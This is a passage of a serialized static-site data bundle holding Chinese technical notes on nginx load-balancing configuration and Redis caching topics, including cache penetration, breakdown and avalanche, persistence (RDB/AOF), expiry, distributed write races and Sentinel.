基于发起请求的客户端的ip地址不同，他始终会将请求发送到指定的服务器上 就是说如果这个客户端的请求的ip地址不变，那么处理请求的服务器将一直是同一个\n\n\n# 轮询\n\n想实现nginx轮询负载均衡机制只需要修改配置文件如下\n\n# 声明一个upstream\nupstream my_server{\n    server ip1:port1;\n    server ip2:port2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\t# 上面声明的地址\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 权重\n\n实现权重的方式：在配置文件中upstream块中加上weight\n\nupstream my_server{\n# 增加权重\n    server ip1:port1 weight=10;\n    server ip2:port2 weight=2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# ip_hash\n\n实现ip_hash方式：在配置文件upstream块中加上ip_hash\n\nupstream my_server{\n# 增加ip_hash配置\n  ip_hash;\n  server ip1:port1 weight=10;\n  server ip2:port2 weight=2;\n}\nserver {\n    listen       80;\n    server_name  localhost;\n\n\tlocation / {\n        proxy_pass http://my_server/;\t\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"缓存穿透、缓存击穿、缓存雪崩区别和解决方案",frontmatter:{title:"缓存穿透、缓存击穿、缓存雪崩区别和解决方案",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/f2187d/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/01.%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F%E3%80%81%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF%E3%80%81%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E5%8C%BA%E5%88%AB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html",relativePath:"08.软件使用/07.redis/01.缓存穿透、缓存击穿、缓存雪崩区别和解决方案.md",key:"v-2de513fc",path:"/pages/f2187d/",headersStr:null,content:"# 一、缓存处理流程\n\n前台请求，后台先从缓存中取数据，取到直接返回结果，取不到时从数据库中取，数据库取到更新缓存，并返回结果，数据库也没取到，那直接返回空结果。\n\n\n\n\n# 二、缓存穿透\n\n描述：\n\n缓存穿透是指缓存和数据库中都没有的数据，而用户不断发起请求，如发起为id为“-1”的数据或id为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大。\n\n解决方案：\n\n 1. 接口层增加校验，如用户鉴权校验，id做基础校验，id<=0的直接拦截；\n 2. 从缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，缓存有效时间可以设置短点，如30秒（设置太长会导致正常情况也没法使用）。这样可以防止攻击用户反复用同一个id暴力攻击\n\n\n# 三、缓存击穿\n\n描述：\n\n缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大，造成过大压力\n\n解决方案：\n\n 1. 设置热点数据永远不过期。\n 2. 加互斥锁，互斥锁参考代码如下：\n\n\n\n说明：\n\n1）缓存中有数据，直接走上述代码13行后就返回结果了\n\n2）缓存中没有数据，第1个进入的线程，获取锁并从数据库去取数据，没释放锁之前，其他并行进入的线程会等待100ms，再重新去缓存取数据。这样就防止都去数据库重复取数据，重复往缓存中更新数据情况出现。\n\n3）当然这是简化处理，理论上如果能根据key值加锁就更好了，就是线程A从数据库取key1的数据并不妨碍线程B取key2的数据，上面代码明显做不到这点。\n\n\n# 四、缓存雪崩\n\n描述：\n\n缓存雪崩是指缓存中数据大批量到过期时间，而查询数据量巨大，引起数据库压力过大甚至down机。和缓存击穿不同的是，缓存击穿指并发查同一条数据，缓存雪崩是不同数据都过期了，很多数据都查不到从而查数据库。\n\n解决方案：\n\n 1. 缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。\n 2. 如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中。\n 3. 设置热点数据永远不过期。",normalizedContent:"# 一、缓存处理流程\n\n前台请求，后台先从缓存中取数据，取到直接返回结果，取不到时从数据库中取，数据库取到更新缓存，并返回结果，数据库也没取到，那直接返回空结果。\n\n\n\n\n# 二、缓存穿透\n\n描述：\n\n缓存穿透是指缓存和数据库中都没有的数据，而用户不断发起请求，如发起为id为“-1”的数据或id为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大。\n\n解决方案：\n\n 1. 接口层增加校验，如用户鉴权校验，id做基础校验，id<=0的直接拦截；\n 2. 从缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，缓存有效时间可以设置短点，如30秒（设置太长会导致正常情况也没法使用）。这样可以防止攻击用户反复用同一个id暴力攻击\n\n\n# 三、缓存击穿\n\n描述：\n\n缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大，造成过大压力\n\n解决方案：\n\n 1. 设置热点数据永远不过期。\n 2. 加互斥锁，互斥锁参考代码如下：\n\n\n\n说明：\n\n1）缓存中有数据，直接走上述代码13行后就返回结果了\n\n2）缓存中没有数据，第1个进入的线程，获取锁并从数据库去取数据，没释放锁之前，其他并行进入的线程会等待100ms，再重新去缓存取数据。这样就防止都去数据库重复取数据，重复往缓存中更新数据情况出现。\n\n3）当然这是简化处理，理论上如果能根据key值加锁就更好了，就是线程a从数据库取key1的数据并不妨碍线程b取key2的数据，上面代码明显做不到这点。\n\n\n# 四、缓存雪崩\n\n描述：\n\n缓存雪崩是指缓存中数据大批量到过期时间，而查询数据量巨大，引起数据库压力过大甚至down机。和缓存击穿不同的是，缓存击穿指并发查同一条数据，缓存雪崩是不同数据都过期了，很多数据都查不到从而查数据库。\n\n解决方案：\n\n 1. 缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。\n 2. 如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中。\n 3. 设置热点数据永远不过期。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Raft选举算法",frontmatter:{title:"Raft选举算法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/ff379d/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/03.Raft%E9%80%89%E4%B8%BE%E7%AE%97%E6%B3%95.html",relativePath:"08.软件使用/07.redis/03.Raft选举算法.md",key:"v-fd541806",path:"/pages/ff379d/",headersStr:null,content:"https://www.bilibili.com/video/BV13Q4y167Hy\n\n【IT老齐057】这可能是最简单粗暴的Raft选举算法讲解了吧！.pdf",normalizedContent:"https://www.bilibili.com/video/bv13q4y167hy\n\n【it老齐057】这可能是最简单粗暴的raft选举算法讲解了吧！.pdf",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"如何保证缓存与数据库的双写一致性？",frontmatter:{title:"如何保证缓存与数据库的双写一致性？",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/391955/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/02.%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E7%BC%93%E5%AD%98%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8F%8C%E5%86%99%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%9F.html",relativePath:"08.软件使用/07.redis/02.如何保证缓存与数据库的双写一致性？.md",key:"v-772a0bb2",path:"/pages/391955/",headersStr:null,content:"（1）读的时候，先读缓存，缓存没有的话，那么就读数据库，然后取出数据后放入缓存，同时返回响应 （2）更新的时候，先删除缓存，然后再更新数据库\n\n\n# 为什么是删除，而不是更新\n\n因为缓存可能并不是某单张表的一条直接读取出来的 而是读取多个表的多条数据计算得到的\n\n那么因为如果是更新的话，假设这个数据并不是经常被访问，每次更新都要在数据库好几个表，而删除的话，只是需要读取的时候，访问数据库\n\n\n# 单机模式分析\n\n为什么选择先删除缓存，再更新数据库？\n\n如果先更新数据库，再操作缓存，如果缓存操作缓存失败，则会导致双写不一致\n\n如果删除缓存，即使后面操作数据库失败了，那也就是数据库里保存的是旧数据，但是缓存和数据库依然是一致的\n\n\n# 并发模式分析\n\n当一个线程需要更新，直接删除了缓存，准备操作数据库，此时又来了一个线程，发现缓存没数据了，又去数据库里读到缓存，缓存有数据之后，第一个线程才修改好数据库，此时就发生了缓存和数据库双写不一致的问题\n\n这个时候需要根据数据hash到对应的队列里，在队列里以此执行，使得对数据操作能够串行化，然后等操作完成，就去回调之后的方法，用异步的方式解决问题",normalizedContent:"（1）读的时候，先读缓存，缓存没有的话，那么就读数据库，然后取出数据后放入缓存，同时返回响应 （2）更新的时候，先删除缓存，然后再更新数据库\n\n\n# 为什么是删除，而不是更新\n\n因为缓存可能并不是某单张表的一条直接读取出来的 而是读取多个表的多条数据计算得到的\n\n那么因为如果是更新的话，假设这个数据并不是经常被访问，每次更新都要在数据库好几个表，而删除的话，只是需要读取的时候，访问数据库\n\n\n# 单机模式分析\n\n为什么选择先删除缓存，再更新数据库？\n\n如果先更新数据库，再操作缓存，如果缓存操作缓存失败，则会导致双写不一致\n\n如果删除缓存，即使后面操作数据库失败了，那也就是数据库里保存的是旧数据，但是缓存和数据库依然是一致的\n\n\n# 并发模式分析\n\n当一个线程需要更新，直接删除了缓存，准备操作数据库，此时又来了一个线程，发现缓存没数据了，又去数据库里读到缓存，缓存有数据之后，第一个线程才修改好数据库，此时就发生了缓存和数据库双写不一致的问题\n\n这个时候需要根据数据hash到对应的队列里，在队列里以此执行，使得对数据操作能够串行化，然后等操作完成，就去回调之后的方法，用异步的方式解决问题",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Redis 持久化",frontmatter:{title:"Redis 持久化",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d723a6/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/04.Redis%20%E6%8C%81%E4%B9%85%E5%8C%96.html",relativePath:"08.软件使用/07.redis/04.Redis 持久化.md",key:"v-314453cf",path:"/pages/d723a6/",headers:[{level:2,title:"RDB持久化机制",slug:"rdb持久化机制",normalizedTitle:"rdb持久化机制",charIndex:404},{level:2,title:"AOF持久化机制",slug:"aof持久化机制",normalizedTitle:"aof持久化机制",charIndex:456},{level:2,title:"RDB持久化机制的优点",slug:"rdb持久化机制的优点",normalizedTitle:"rdb持久化机制的优点",charIndex:1124},{level:2,title:"RDB持久化的缺点",slug:"rdb持久化的缺点",normalizedTitle:"rdb持久化的缺点",charIndex:1827},{level:2,title:"AOF持久化的优点",slug:"aof持久化的优点",normalizedTitle:"aof持久化的优点",charIndex:2135},{level:2,title:"AOF持久化机制的缺点",slug:"aof持久化机制的缺点",normalizedTitle:"aof持久化机制的缺点",charIndex:2607},{level:2,title:"RDB和AOF的选择",slug:"rdb和aof的选择",normalizedTitle:"rdb和aof的选择",charIndex:3015}],headersStr:"RDB持久化机制 AOF持久化机制 RDB持久化机制的优点 RDB持久化的缺点 AOF持久化的优点 AOF持久化机制的缺点 RDB和AOF的选择",content:"# Redis持久化的意义\n\nRedis持久化的意义，在于故障恢复，也属于高可用的一个环节。例如\n\n当存放在内存中数据，会因为Redis的突然挂掉，而导致数据丢失\n\nRedis的持久化，就是将内存中的数据，持久化到磁盘上中，然后将磁盘上的数据放到阿里云ODPS中\n\n通过持久化将数据存储在磁盘中，然后定期比如说同步和备份到一些云存储服务上去。\n\n\n# Redis中的RDB和AOF两种持久化机制\n\n当出现Redis宕机时，我们需要做的是重启redis，尽快让他对外提供服务，缓存全部无法命中，在redis里根本找不到数据，这时候就会出现缓存雪崩的问题。所有的请求，没有在Redis中命中，就会去MySQL数据库这种数据源头中找，一下子MySQL无法承受高并发，那么系统将直接宕机。这个时候MySQL宕机，因为没办法从MySQL中将缓存恢复到Redis中，因为Redis中的数据是从MySQL中来的。\n\n\n# RDB持久化机制\n\n简单来说RDB：就是将Redis中的数据，每个一段时间，进行数据持久化\n\n\n\n\n# AOF持久化机制\n\nRedis将内存中的数据，存放到一个AOF文件中，但是因为Redis只会写一个AOF文件，因此这个AOF文件会越来越大。\n\nAOF机制对每条写入命令作为日志，以append-only的模式写入一个日志文件中，在Redis重启的时候，可以通过回放AOF日志中的写入指令来重新构建整个数据集。\n\n\n\n因为Redis中的数据是有一定限量的，不可能说Redis内存中的数据不限量增长，进而导致AOF无限量增长。\n\n内存大小是一定的，到一定时候，Redis就会用缓存淘汰算法，LRU，自动将一部分数据从内存中给清除。\n\nAOF，是存放每条写命令的，所以会不断的膨胀，当大到一定的时候，AOF做rewrite操作。\n\nAOF rewrite操作，就会基于当时redis内存中的数据，来重新构造一个更小的AOF文件，然后将旧的膨胀的很大的文件给删了。\n\n如果我们想要Redis仅仅作为纯内存的缓存来使用，那么可以禁止RDB和AOF所有的持久化机制\n\n通过AOF和RDB，都可以将Redis内存中的数据给持久化到磁盘上面来，然后可以将这些数据备份到其它地方去，例如阿里云的OOS。\n\n如果Redis挂了，服务器上的内存和磁盘上的数据都丢了，可以从云服务上拷贝回来之前的数据，放到指定的目录下，然后重新启动Redis，Redis就会自动根据持久化数据文件，去恢复内存中的数据，继续对外提供服务。\n\n如果同时使用RDB和AOF两种持久化机制，那么在Redis重启的时候，会使用AOF来重新构建数据，因为AOF中的数据更加完整。\n\n\n# RDB持久化机制的优点\n\n * RDB会生成多个数据文件，每个数据文件都代表了某个时刻中Redis的数据，这种多个数据文件的方式，非常适合做冷备份，可以将这种完整的数据文件发送到一些远程的安全存储上去，例如阿里云ODPS分布式存储上，以预定好的备份策略来定期备份Redis中的数据\n   * RDB也可以做冷备份，生成多个文件，每个文件代表了某个时刻的完整的数据快照\n   * AOF也可以做冷备，只有一个文件，但是你可以每隔一段时间，去copy一份文件出来\n   * RDB做冷备份的优势在于，可以由Redis去控制固定时长生成快照文件的事情，比较方便。AOF还需要自己写一些脚本去做这个事情，各种定时。\n * RDB对Redis对外提供的读写服务，影响非常小，可以让Redis保持高性能，因为Redis主进程只需要fork一个子进程，让子进程执行磁盘IO操作来进行RDB持久化即可。\n   * RDB每次写都是些Redis内存的，只是在一定的时间内，才将数据写入磁盘\n   * AOF每次都要写文件，虽然可以快速写入 OS Cache中，但是还是会有一定的时间开销，速度肯定比RDB略慢一点。\n * 相对于AOF持久化机制来说，直接基于RDB数据文件来重启和恢复Redis进程，更加快速。\n   * RDB数据做冷备份，在最坏的情况下，提供数据恢复的时候，速度比AOF快。\n   * AOF，存放的指令日志，做数据恢复的时候，其实是要回放和执行所有的指令日志，来恢复出来内存中的所有数据的，而RDB就是一份数据文件，恢复的时候，直接加载进内存即可。\n\n综合上面可以知道：RDB特别适合做冷备份\n\n\n# RDB持久化的缺点\n\n * 如果想要在Redis故障时，尽可能的少丢失数据，那么RDB没有AOF好，一般来说，RDB数据快照文件，都是每隔5分钟，或者更长时间生成一次，这个时候就得接受一旦Redis经常宕机，那么丢失最近5分钟的数据。\n\n\n\n这个文件也是RDB最大的缺点，就是不适合做第一优先级的恢复方案，如果你依赖RDB做第一优先级方案，会导致数据丢失的比较多。\n\n * RDB每次在fork子进程来执行RDB快照数据生成的时候，如果数据文件特别大，可能会导致对客户端提供的服务暂停数毫秒，或者甚至数秒\n   * 一般不要让RDB的间隔太长，否则每次生成的RDB文件太长，会对Redis本身的性能会有影响\n\n\n# AOF持久化的优点\n\n * AOF可以更好的保护数据不丢失，一般AOF会间隔一秒，通过一个后台线程执行一次fsync操作，最多丢失1秒\n * AOF日志文件以append-only模式写入，所有没有任何磁盘寻址开销，写入性能非常高，而且文件不容易破损，即使文件尾部破损，也很容易快速修复。\n * AOF日志文件及时过大的时候，出现后台的重写操作，也不会影响客户端的读写，因为rewrite log 的时候，会对其中的数据进行压缩，创建出一份需要恢复数据的最小日志出来，再创建新日志文件的时候，老的日志文件还是照常写入，当新的merge后的日志文件ready的时候，再交换新老日志文件即可。\n * AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复，比如某人不小心用了 flushall命令，清空了整个Redis数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令删除了，然后再将该AOF文件放回去，就可以通过恢复机制，自动回复所有的数据。\n\n\n# AOF持久化机制的缺点\n\n * 对于同一份数据来说，AOF日志通常比RDB数据快照文件更大\n * AOF开启后，支持写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，因此这也就造成了性能不是很高。\n   * 如果你要保证一条数据都不丢，也可以的，AOF的fsync设置成每次写入一条数据，fsync一次，这样Redis的QPS会大降。\n * AOF这种较为复杂的基于命令日志/merge/回放的方式，比基于RDB每次持久化一份完整的数据快照的方式，更加脆弱一些，容易有BUG，不过AOF就是为了避免rewrite过程导致的BUG，因此每次rewrite并不是基于旧的指令来进行merge的，而是基于当时内存中数据进行指令的重新构建，这与健壮性会好一些。\n * 唯一的缺点：就是做数据恢复的时候，会比较慢，还有做冷备，定期的被封，不太方便，可能要自己手动写复杂的脚本去做。\n\n\n# RDB和AOF的选择\n\n * 不要仅仅使用RDB，因为那样会导致你丢失很多的数据\n * 也不要仅仅使用AOF，因为这样有两个问题\n   * AOF做冷备，没有RDB冷备恢复快\n   * RDB每次简单粗暴的生成数据快照，更加健壮，可以避免AOF这种复杂的被封和恢复机制的BUG\n * 综合使用AOF和RDB两种持久化机制，用AOF来保证数据不丢失，作为数据恢复的第一选择，用RDB来做不同程度的冷备，在AOF文件都丢失或者损坏不可用的时候，可以使用RDB来进行快速的数据恢复。",normalizedContent:"# redis持久化的意义\n\nredis持久化的意义，在于故障恢复，也属于高可用的一个环节。例如\n\n当存放在内存中数据，会因为redis的突然挂掉，而导致数据丢失\n\nredis的持久化，就是将内存中的数据，持久化到磁盘上中，然后将磁盘上的数据放到阿里云odps中\n\n通过持久化将数据存储在磁盘中，然后定期比如说同步和备份到一些云存储服务上去。\n\n\n# redis中的rdb和aof两种持久化机制\n\n当出现redis宕机时，我们需要做的是重启redis，尽快让他对外提供服务，缓存全部无法命中，在redis里根本找不到数据，这时候就会出现缓存雪崩的问题。所有的请求，没有在redis中命中，就会去mysql数据库这种数据源头中找，一下子mysql无法承受高并发，那么系统将直接宕机。这个时候mysql宕机，因为没办法从mysql中将缓存恢复到redis中，因为redis中的数据是从mysql中来的。\n\n\n# rdb持久化机制\n\n简单来说rdb：就是将redis中的数据，每个一段时间，进行数据持久化\n\n\n\n\n# aof持久化机制\n\nredis将内存中的数据，存放到一个aof文件中，但是因为redis只会写一个aof文件，因此这个aof文件会越来越大。\n\naof机制对每条写入命令作为日志，以append-only的模式写入一个日志文件中，在redis重启的时候，可以通过回放aof日志中的写入指令来重新构建整个数据集。\n\n\n\n因为redis中的数据是有一定限量的，不可能说redis内存中的数据不限量增长，进而导致aof无限量增长。\n\n内存大小是一定的，到一定时候，redis就会用缓存淘汰算法，lru，自动将一部分数据从内存中给清除。\n\naof，是存放每条写命令的，所以会不断的膨胀，当大到一定的时候，aof做rewrite操作。\n\naof rewrite操作，就会基于当时redis内存中的数据，来重新构造一个更小的aof文件，然后将旧的膨胀的很大的文件给删了。\n\n如果我们想要redis仅仅作为纯内存的缓存来使用，那么可以禁止rdb和aof所有的持久化机制\n\n通过aof和rdb，都可以将redis内存中的数据给持久化到磁盘上面来，然后可以将这些数据备份到其它地方去，例如阿里云的oos。\n\n如果redis挂了，服务器上的内存和磁盘上的数据都丢了，可以从云服务上拷贝回来之前的数据，放到指定的目录下，然后重新启动redis，redis就会自动根据持久化数据文件，去恢复内存中的数据，继续对外提供服务。\n\n如果同时使用rdb和aof两种持久化机制，那么在redis重启的时候，会使用aof来重新构建数据，因为aof中的数据更加完整。\n\n\n# rdb持久化机制的优点\n\n * rdb会生成多个数据文件，每个数据文件都代表了某个时刻中redis的数据，这种多个数据文件的方式，非常适合做冷备份，可以将这种完整的数据文件发送到一些远程的安全存储上去，例如阿里云odps分布式存储上，以预定好的备份策略来定期备份redis中的数据\n   * rdb也可以做冷备份，生成多个文件，每个文件代表了某个时刻的完整的数据快照\n   * aof也可以做冷备，只有一个文件，但是你可以每隔一段时间，去copy一份文件出来\n   * rdb做冷备份的优势在于，可以由redis去控制固定时长生成快照文件的事情，比较方便。aof还需要自己写一些脚本去做这个事情，各种定时。\n * rdb对redis对外提供的读写服务，影响非常小，可以让redis保持高性能，因为redis主进程只需要fork一个子进程，让子进程执行磁盘io操作来进行rdb持久化即可。\n   * rdb每次写都是些redis内存的，只是在一定的时间内，才将数据写入磁盘\n   * aof每次都要写文件，虽然可以快速写入 os cache中，但是还是会有一定的时间开销，速度肯定比rdb略慢一点。\n * 相对于aof持久化机制来说，直接基于rdb数据文件来重启和恢复redis进程，更加快速。\n   * rdb数据做冷备份，在最坏的情况下，提供数据恢复的时候，速度比aof快。\n   * aof，存放的指令日志，做数据恢复的时候，其实是要回放和执行所有的指令日志，来恢复出来内存中的所有数据的，而rdb就是一份数据文件，恢复的时候，直接加载进内存即可。\n\n综合上面可以知道：rdb特别适合做冷备份\n\n\n# rdb持久化的缺点\n\n * 如果想要在redis故障时，尽可能的少丢失数据，那么rdb没有aof好，一般来说，rdb数据快照文件，都是每隔5分钟，或者更长时间生成一次，这个时候就得接受一旦redis经常宕机，那么丢失最近5分钟的数据。\n\n\n\n这个文件也是rdb最大的缺点，就是不适合做第一优先级的恢复方案，如果你依赖rdb做第一优先级方案，会导致数据丢失的比较多。\n\n * rdb每次在fork子进程来执行rdb快照数据生成的时候，如果数据文件特别大，可能会导致对客户端提供的服务暂停数毫秒，或者甚至数秒\n   * 一般不要让rdb的间隔太长，否则每次生成的rdb文件太长，会对redis本身的性能会有影响\n\n\n# aof持久化的优点\n\n * aof可以更好的保护数据不丢失，一般aof会间隔一秒，通过一个后台线程执行一次fsync操作，最多丢失1秒\n * aof日志文件以append-only模式写入，所有没有任何磁盘寻址开销，写入性能非常高，而且文件不容易破损，即使文件尾部破损，也很容易快速修复。\n * aof日志文件及时过大的时候，出现后台的重写操作，也不会影响客户端的读写，因为rewrite log 的时候，会对其中的数据进行压缩，创建出一份需要恢复数据的最小日志出来，再创建新日志文件的时候，老的日志文件还是照常写入，当新的merge后的日志文件ready的时候，再交换新老日志文件即可。\n * aof日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复，比如某人不小心用了 flushall命令，清空了整个redis数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝aof文件，将最后一条flushall命令删除了，然后再将该aof文件放回去，就可以通过恢复机制，自动回复所有的数据。\n\n\n# aof持久化机制的缺点\n\n * 对于同一份数据来说，aof日志通常比rdb数据快照文件更大\n * aof开启后，支持写qps会比rdb支持的写qps低，因为aof一般会配置成每秒fsync一次日志文件，因此这也就造成了性能不是很高。\n   * 如果你要保证一条数据都不丢，也可以的，aof的fsync设置成每次写入一条数据，fsync一次，这样redis的qps会大降。\n * aof这种较为复杂的基于命令日志/merge/回放的方式，比基于rdb每次持久化一份完整的数据快照的方式，更加脆弱一些，容易有bug，不过aof就是为了避免rewrite过程导致的bug，因此每次rewrite并不是基于旧的指令来进行merge的，而是基于当时内存中数据进行指令的重新构建，这与健壮性会好一些。\n * 唯一的缺点：就是做数据恢复的时候，会比较慢，还有做冷备，定期的被封，不太方便，可能要自己手动写复杂的脚本去做。\n\n\n# rdb和aof的选择\n\n * 不要仅仅使用rdb，因为那样会导致你丢失很多的数据\n * 也不要仅仅使用aof，因为这样有两个问题\n   * aof做冷备，没有rdb冷备恢复快\n   * rdb每次简单粗暴的生成数据快照，更加健壮，可以避免aof这种复杂的被封和恢复机制的bug\n * 综合使用aof和rdb两种持久化机制，用aof来保证数据不丢失，作为数据恢复的第一选择，用rdb来做不同程度的冷备，在aof文件都丢失或者损坏不可用的时候，可以使用rdb来进行快速的数据恢复。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 的过期策略",frontmatter:{title:"redis 的过期策略",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4af20a/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/05.redis%20%E7%9A%84%E8%BF%87%E6%9C%9F%E7%AD%96%E7%95%A5.html",relativePath:"08.软件使用/07.redis/05.redis 的过期策略.md",key:"v-6a8de6ac",path:"/pages/4af20a/",headersStr:null,content:"redis的数据过期之后并不会马上删除数据，采用的是定时删除和惰性删除\n\n定时删除：定时随机选取一批数据遍历，查看是否过期，如果过期就删除\n\n惰性删除：当访问数据的时候，查看是否过期，如果过期则删除",normalizedContent:"redis的数据过期之后并不会马上删除数据，采用的是定时删除和惰性删除\n\n定时删除：定时随机选取一批数据遍历，查看是否过期，如果过期就删除\n\n惰性删除：当访问数据的时候，查看是否过期，如果过期则删除",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 分布式竞争与解决",frontmatter:{title:"redis 分布式竞争与解决",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4aaaf8/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/06.redis%20%E5%88%86%E5%B8%83%E5%BC%8F%E7%AB%9E%E4%BA%89%E4%B8%8E%E8%A7%A3%E5%86%B3.html",relativePath:"08.软件使用/07.redis/06.redis 分布式竞争与解决.md",key:"v-3301d501",path:"/pages/4aaaf8/",headersStr:null,content:"# 什么是redis的分布式？\n\n这个也是线上非常常见的一个问题，就是多客户端同时并发写一个key，可能本来应该先到的数据后到了，导致数据版本错了。或者是多客户端同时获取一个key，修改值之后再写回去，只要顺序错了，数据就错了\n\n如下图所示：我们有好几个系统同时取访问缓存，并且发起了一个写缓存的操作\n\nset V1、V2、V3、V4 我们期望的是它是有顺序的去执行，但是最后却没有顺序了 变成了：set V1、V3、V4、V2\n\n\n# 解决方法\n\n使用zookeeper分布式锁，可以使得多个并发不会同时执行 其次redis的缓存数据都来自于mysql ,之前存数据的时候加入时间戳 那么redis读取出来的时候就会有时间戳 将数据读入缓存的时候检查时间戳是否是比现有的缓存新，新就覆盖，否则放弃操作",normalizedContent:"# 什么是redis的分布式？\n\n这个也是线上非常常见的一个问题，就是多客户端同时并发写一个key，可能本来应该先到的数据后到了，导致数据版本错了。或者是多客户端同时获取一个key，修改值之后再写回去，只要顺序错了，数据就错了\n\n如下图所示：我们有好几个系统同时取访问缓存，并且发起了一个写缓存的操作\n\nset v1、v2、v3、v4 我们期望的是它是有顺序的去执行，但是最后却没有顺序了 变成了：set v1、v3、v4、v2\n\n\n# 解决方法\n\n使用zookeeper分布式锁，可以使得多个并发不会同时执行 其次redis的缓存数据都来自于mysql ,之前存数据的时候加入时间戳 那么redis读取出来的时候就会有时间戳 将数据读入缓存的时候检查时间戳是否是比现有的缓存新，新就覆盖，否则放弃操作",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"redis 高可用架构 ： Sentinel",frontmatter:{title:"redis 高可用架构 ： Sentinel",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/235e92/",categories:["软件使用","redis"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/07.redis/07.redis%20%E9%AB%98%E5%8F%AF%E7%94%A8%E6%9E%B6%E6%9E%84%20%EF%BC%9A%20Sentinel.html",relativePath:"08.软件使用/07.redis/07.redis 高可用架构 ： Sentinel.md",key:"v-6b682b72",path:"/pages/235e92/",headers:[{level:2,title:"下线",slug:"下线",normalizedTitle:"下线",charIndex:217},{level:2,title:"master节点挂掉，主从切换",slug:"master节点挂掉-主从切换",normalizedTitle:"master节点挂掉，主从切换",charIndex:404},{level:3,title:"选取条件",slug:"选取条件",normalizedTitle:"选取条件",charIndex:426},{level:3,title:"切换过程",slug:"切换过程",normalizedTitle:"切换过程",charIndex:610}],headersStr:"下线 master节点挂掉，主从切换 选取条件 切换过程",content:"redis主从数据同步过程 ： redis 主从架构原理\n\nsentinel英文的意思是哨兵，主要是用于检测主从架构的运行情况，如果master服务挂掉了会重新选取一个slave变成master\n\nSentinel分为leader和普通的Sentinel\n\n\n# redis node节点高可用\n\n每个Sentinel以每秒钟—次的频率向它所知的Master，Slave以及其他 Sentinel 实例发送一个PING命令。\n\n\n# 